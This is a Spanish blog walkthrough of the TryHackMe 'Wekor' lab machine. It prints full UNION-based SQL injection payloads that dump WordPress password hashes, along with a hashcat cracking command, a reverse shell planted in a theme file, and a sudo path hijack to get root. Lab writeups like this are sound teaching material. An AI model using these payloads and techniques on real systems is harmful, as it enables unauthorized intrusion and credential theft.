---
layout: post
title:  "Wekor – TryHackMe – Writeup/Walkthrough "
summary: "Resolvemos la máquina Wekor donde se nos presenta enumeración de subdominios, explotación de wordpress, sqli y mucho más."
date: '2022-02-17 08:35:23 +0530'
category: ['tryhackme','writeup','walkthrough']
thumbnail: /assets/img/posts/wekor/fondo.jpg
keywords: tryhackme, wekor, writeup, walkthrought 
permalink: /blog/wekor-tryhackme-writeup-walkthrough/
author: r4z0r
---

Muy buenas a todos, hoy toca resolver una máquina muy divertida y de la que aprendí mucho, la máquina wekor de la plataforma de TryHackMe, asi que a darle!

## Enumeración

En la fase de enumeración encontramos dos puertos abiertos, el puerto 22 ssh y el puerto 80 http.

![nmap ports](/assets/img/posts/wekor/nmap ports.png)

Una vez detectados estos puertos lanzamos una serie de scripts por defecto y detectamos versiones y servicios de los puertos descubiertos.

![nmap scripts](/assets/img/posts/wekor/nmap sc 1.png)

Navegamos hacia site.wekor, anteriormente a esto tienen que agregar al /etc/hosts la dirección ip de la máquina para que pueda resolver el dominio con la ip que nos otorga tryhackme, esto nos los explica el autor de la máquina en el reto.

```bash
echo "ip-tryhackme wekor.thm" >> /etc/hosts
```

![wekor](/assets/img/posts/wekor/wekor.png)

Como ven, no hay mucho acá, luego de esto probé ingresando a las urls que nos informó el scan de nmap y en una ruta **comingreallysoon** encontramos algo interesante.

**Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !**

Pasamos entonces a probar la url **/it-next**

![it-next](/assets/img/posts/wekor/it-next1.png)

Luego de navegar hacia el carrito encontré que al aplicar un id de cupón hay una vulnerabilidad de inyección sql. Es de tipo error based ya que vemos reflejada un error en la página cuando colocamos un caracter como ' en el campo del cupón, esto hace que la consulta se rompa y tire un error.

![sqli](/assets/img/posts/wekor/sqli.png)

Pasamos ahora explotar este sqli de forma manual, lo podemos hacer con sqlmap pero así es más fácil, de paso aprendemos a hacerlo manualmente :)
Por si no tenés idea donde estudiar sqli, te dejo este link de la academia de portswigger: [Portswigger Academy](https://portswigger.net/web-security/sql-injection/union-attacks). El tipo de ataque que vamos a realizar es de UNION.

1. Determinamos del número de columnas requeridas en un ataque UNION de inyección SQL

    ```text

    ' order by 1,2,3-- -

    ```

    ![order by](/assets/img/posts/wekor/order by 3.png)

    Podemos ver que nos dice que el cupón no existe, que pasa ahora si ponemos 4 columnas.

    ```text

    ' order by 1,2,3,4-- -

    ```
    ![order by 4](/assets/img/posts/wekor/order by 4.png)

    Con esto identificamos que hay 3 columnas ya que nos arroja un error al colocar 4.

2. Enumeración de bases de datos

    ```text
    ' UNION SELECT 1,2,schema_name from information_schema.schemata-- -
    ```

    ![listar base de datos](/assets/img/posts/wekor/sqli1.png)

    Podemos observar la base de datos wordpress, vamos a listar sus usuarios.

3. Enumeración de Tablas

    ```text 
    ' UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='wordpress'-- -
    ```

    ![listar tablas](/assets/img/posts/wekor/sqli 2.png)

    Seleccionamos la tabla wp_users y enumeramos sus columnas.


4. Enumeración de Columnas

    ```text 
    ' UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='wp_users'-- -
    ```

    ![listar columas](/assets/img/posts/wekor/sqli 3.png)

5. Listamos datos de wp_users

    ```text
    ' UNION SELECT 1,2,GROUP_CONCAT(`user_login`,':',`user_pass`) from wordpress.wp_users-- -
    ```
    
    ![listar datos](/assets/img/posts/wekor/sqli 4.png) 

Ahora podemos observar los usuarios con sus contraseñas hasheadas.

```text
admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10
wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/
wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/
```
Para ver que tipo de hash es podemos hacerlo mediante hashcat --help o hashcat examples en la web.
 
![hashcat help](/assets/img/posts/wekor/hashcat help.png)
 
![hashcat help2](/assets/img/posts/wekor/hashcat2.png)

En john el tipo de hash es phpass. Pero vamos a creackearlas con hashcat.

```bash
hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![hashcat crack](/assets/img/posts/wekor/hashcat outp.png)

Encontré tres credenciales válidas para loguearnos en wordpress. Ahora tenemos que encontrar donde está ese maldito wordpress.

Para eso recurrimos al fuzzing con gobuster para enumerar subdominios.

![gobuster vhost](/assets/img/posts/wekor/gobuster vhost.png)

Encontramos site, ahora accedemos a ese subdominio, no se olvide de agregarlo al /etc/hosts: site.worker.thm

![site](/assets/img/posts/wekor/site.wekor.png)

Ahora que tenemos este subdominio, podemos visitarlo pero no vamos a encontrar más que un mensaje. Por lo cual fuzeamos sobre ese subdominio.

![gobuster2](/assets/img/posts/wekor/gobuster 2.png)

Ahí está el maldito wordpress, jaja, lo visitamos y podemos ver un simple blog vacío.
 
![site wordpress](/assets/img/posts/wekor/site.wekor.wordpress.png)

Podemos jugar con wpscan para enumerar usuarios o encontrar plugins vulnerables, pero solo tiré desde curl para ver que usuarios hay dentro de ese wordpress, si tiene habilitada la api puedo enumerar usuarios, cosa muyyyy común en sitios wordpress.

![admin wp](/assets/img/posts/wekor/admin wp.png)

Desde la api solo se nos lista un usuario, en esta ocasión me salto wpscan para hacerlo más rápido, pero recordemos que tenemos varios usuarios según la info que obtuvimos con el sqli asi que probamos accediendo con las creds que tenemos.
Si se dirigen a **http://site.wekor.thm/wordpress/wp-login.php** pueden encontrar el panel de login.

![wp yura](/assets/img/posts/wekor/wp yura admin.png)

Luego de probar, con el user wp_yura somos administradores asi que genial, podemos editar el tema por defecto y subir una reverse shell en php.

![wp theme editor](/assets/img/posts/wekor/wp theme editor.png)

Hago uso de la reverse shell que me da la extensión de **hack tooks**, muy recomendada la extensión tiene de todo!
Esa reverse shell la metemos dentro del template 404.php y la guardamos. 

![rev shell php](/assets/img/posts/wekor/rev shell php.png)

![rev shell](/assets/img/posts/wekor/php rev 2.png)

Luego nos ponemos a la escucha en el puerto seteado en la reverse shell y visitando la ruta del 404.php deberíamos ganar acceso al sistema.

```text
http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

![www-data](/assets/img/posts/wekor/www data.png)

Somos el usuario www-data, ahora podemos hacer un tratamiento de la tty para hacer nuestra consola más interactiva.

```bash
script /dev/null -c bash
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 37 173
```

## Movimiento lateral

Luego de un rato revisar la máquina tiré de linpeas para si había algún vector para escalar privilegios.

[Uso y descarga de linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

![memcache](/assets/img/posts/wekor/memcache.png)

Podemos ver un puerto raro, nunca lo había visto antes, investigando en hacktricks, en lo personal la mejor página de hacking que conozco está la forma de enumerar información con esto.

## ¿Qué es memcache?
Sistema de almacenamiento en caché que nos permite aliviar las cargas de la base de datos, por lo cual vuelve a las aplicaciones web dinámicas más rápidas. A través de este puerto abierto que nos concede memcache podemos obtener información relevante.

[Artículo memcache, Hacktricks](https://book.hacktricks.xyz/pentesting/11211-memcache)

[Memcache.org](https://memcached.org/)

![memcache dump](/assets/img/posts/wekor/username pass echo.png)

Con ese comando vemos el usuario Orka y su password desde el memcache.

![orka](/assets/img/posts/wekor/orka user.png)

Dentro de la carpeta personal de orka pueden encontrar la primer flag, user.txt, pero nada de spoiler, hágalo usted mismo señor.

## Escalada de privilegios 

Ok, ya somos un usuario normalito, pero necesitamos la flag de root, para eso hacemos un sudo -l y podemos observar lo siguiente:

![sudo -l](/assets/img/posts/wekor/sudo -l.png)

Vemos que Orka puede ejecutar como el usuario root el script bitcoin.

![bitcoin pass](/assets/img/posts/wekor/test root bitcoin.png)

Ejecutamos y vemos que se nos pide un password, pero ni idea cual es, por lo cual hay que ver que hay dentro del script con strings.

![bitcoin](/assets/img/posts/wekor/password bitcoin.png)

![bitcoin2](/assets/img/posts/wekor/password bitcoin 2.png)

Está raro el script, pero podemos hacer algo, modificamos el fichero bitcoin por una bash, y como en el sudoers está llamando a esa ruta, si nuestra bash se llama bitcoin podemos ejecutarlo como root y obtener una shell.

![root flag](/assets/img/posts/wekor/root flag.png)

Lo que hice fue una copia de /bin/bash a /Desktop/bitcoin, entonces ahora bitcoin es una copia de bash, cuando se ejecute el comando permitido en el fichero sudoers como root se va a ejecutar bash con lo cual nos otorga una shell como root, capish?

Eso fue todo cracks, espero les haya gustado, es una máquina sencilla pero buena para aprender cosas importantes como inyección sql.

Nos vemos pronto.

[R4z0r](https://juankaenel.github.io)👨‍💻


